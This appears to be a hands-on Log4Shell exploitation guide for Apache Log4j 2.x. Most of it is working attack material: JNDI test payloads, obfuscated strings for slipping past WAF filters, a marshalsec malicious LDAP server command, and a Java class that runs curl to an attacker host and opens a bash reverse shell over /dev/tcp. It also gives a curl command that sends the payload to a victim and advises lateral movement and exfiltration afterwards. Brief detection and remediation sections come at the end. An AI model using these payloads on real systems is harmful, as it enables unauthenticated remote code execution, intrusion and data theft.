messages.content:
LOG4SHELL — the most critical Java vulnerability in a decade.

VULNERABILITY:
Apache Log4j 2.x (2.0-beta9 to 2.14.1). CVSS 10.0.
Log4j performs JNDI (Java Naming and Directory Interface) lookups in log messages.
If you can get your string logged: ${jndi:ldap://attacker.com/a}
Log4j resolves the URL -> fetches remote Java class -> executes it.
Unauthenticated RCE. Trivial to exploit. Affects hundreds of millions of Java applications.

TRIGGER POINTS:
Any user-controlled data that gets logged. Common locations:
 HTTP headers: User-Agent, X-Forwarded-For, X-Api-Version, Referer, Username in auth.
 Form fields, search queries, filenames, email addresses.
 Anything your application logs.

TEST PAYLOAD:
${jndi:ldap://BURP-COLLABORATOR.net/a}
# If you get a DNS/HTTP hit on your Burp Collaborator: vulnerable.
# Also works: ${jndi:ldaps://}, ${jndi:rmi://}, ${jndi:dns://}

BYPASS WAF FILTERS (obfuscation):
${${lower:j}ndi:${lower:l}${lower:d}ap://attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}
${${upper:j}ndi:ldap://attacker.com/a}
${j${::-n}di:ldap://attacker.com/a}
${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}
# Nested variable expansion defeats many regex-based WAFs.

FULL EXPLOITATION SETUP:

Step 1 — Malicious LDAP server:
# marshalsec: Java deserialization LDAP server
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8888/#Exploit"

Step 2 — Malicious Java class:
public class Exploit {
 static { try {
 Runtime.getRuntime().exec("curl http://ATTACKER_IP/`id`");
 // Or: reverse shell
 Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",
 "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"});
 } catch(Exception e) { e.printStackTrace(); } }
}
javac Exploit.java
# Serve: python3 -m http.server 8888

Step 3 — Send payload:
curl -H "User-Agent: \${jndi:ldap://ATTACKER_IP:1389/a}" http://VICTIM/

IMPACT: Code execution as the Java process user.
Follow with: LPE if needed, lateral movement, data exfiltration.

DETECTION:
Scan: lunasec Log4Shell scanner, TurboScan.
Log monitoring: look for "${jndi:" in application logs.
Network: unusual LDAP/RMI outbound connections from Java processes.

REMEDIATION:
Upgrade Log4j to 2.17.1+ (not just 2.15.0 — that was incomplete fix).
Set log4j2.formatMsgNoLookups=true as JVM argument.
Firewall: block outbound LDAP/RMI/DNS from app servers.
